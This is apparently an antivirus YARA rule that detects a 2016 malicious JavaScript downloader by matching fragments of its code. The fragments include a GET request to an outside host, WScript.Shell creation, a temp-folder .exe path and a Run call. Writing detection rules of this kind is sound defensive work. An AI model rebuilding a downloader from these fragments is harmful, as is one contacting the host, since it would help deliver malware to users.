rule sig_20160330_6bd06990108a58972eb658b92f2dfe5b {
  meta:
    description = "datamaliciousorder - file 20160330_6bd06990108a58972eb658b92f2dfe5b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "26c3a7880508a08f16b46da6f843d1f75e0fe7b5735dc972e98fd36966b46c82"

  strings:
    $s1  = "I0[D](\"GET\", \"http://aaacollectionsjewelry.com/x9djsa\", false);" fullword ascii
    $s2  = "function I(PE, E){K = K * 1; return PE - E;};" fullword ascii
    $s3  = "var PN = function UV() {return WScript[RA](\"WScript\"+\".Shell\");}(), Y = 11;" fullword ascii
    $s4  = "if (I0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ZR() {return PN[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"SQvzlbD4n.ex\" + \"e\";};" fullword ascii
    $s6  = "function U(){return TX + \"\";};" fullword ascii
    $s7  = "function QE(UN){PN[\"Run\"](UN, K, K);};" fullword ascii
    $s8  = "function GV() {return ((L0 == true) && (L0 == YM)) ? 1 : K;};" fullword ascii
    $s9  = "function W(){return 22;};" fullword ascii
    $s10 = "}while (L);" fullword ascii
    $s11 = "function VK()" fullword ascii
    $s12 = "var D0 = new this[\"Date\"]();" fullword ascii
    $s13 = "function U0(){return RA;};" fullword ascii
    $s14 = "return I(H, A);" fullword ascii
    $s15 = "function OP(J) {var GO = (1, 2, 3, 4, 5, J); return GO;};" fullword ascii
    $s16 = "L0 = true; " fullword ascii
    $s17 = "var L0 = false;" fullword ascii
    $s18 = "var PC = false;" fullword ascii
    $s19 = "var YM = false;" fullword ascii
    $s20 = "YM = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}